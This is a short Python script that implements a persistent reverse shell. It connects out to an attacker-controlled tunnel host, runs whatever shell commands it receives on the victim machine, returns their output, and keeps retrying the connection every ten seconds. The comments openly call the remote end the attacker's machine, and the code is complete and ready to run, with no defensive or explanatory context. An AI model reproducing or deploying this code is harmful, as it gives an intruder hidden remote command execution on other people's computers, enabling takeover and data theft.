import socket
import subprocess
import os
import time

# Set up the IP and port of the attacker's machine (your Android device)
attacker_ip = 'TEC-Sadman-35345.portmap.host'  # Replace with your Android device's IP
attacker_port = 35345  # The port you are listening on in Termux

def connect_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((attacker_ip, attacker_port))
        print("Connection established.")
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

# Start in the user's home directory
current_directory = os.getcwd()

while True:
    sock = connect_shell()
    if sock:
        while True:
            try:
                # Receive command from the attacker
                command = sock.recv(1024).decode("utf-8")

                if not command:
                    # If no command is received, reconnect
                    print("Connection lost. Reconnecting...")
                    sock.close()
                    break

                if command.lower() == "exit":
                    sock.close()
                    print("Exiting shell.")
                    break

                # Change the current directory if the command is 'cd'
                if command.startswith("cd "):
                    try:
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        sock.send(f"Changed directory to {current_directory}\n".encode("utf-8"))
                    except FileNotFoundError:
                        sock.send(f"Directory not found: {new_dir}\n".encode("utf-8"))
                else:
                    # Execute other commands in the current directory
                    output = subprocess.run(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        cwd=current_directory,
                    )
                    sock.send(output.stdout + output.stderr)

            except Exception as e:
                sock.send(f"Error: {str(e)}\n".encode("utf-8"))
                break
    else:
        # If connection fails, retry after 10 seconds
        print("Retrying connection...")
        time.sleep(10)
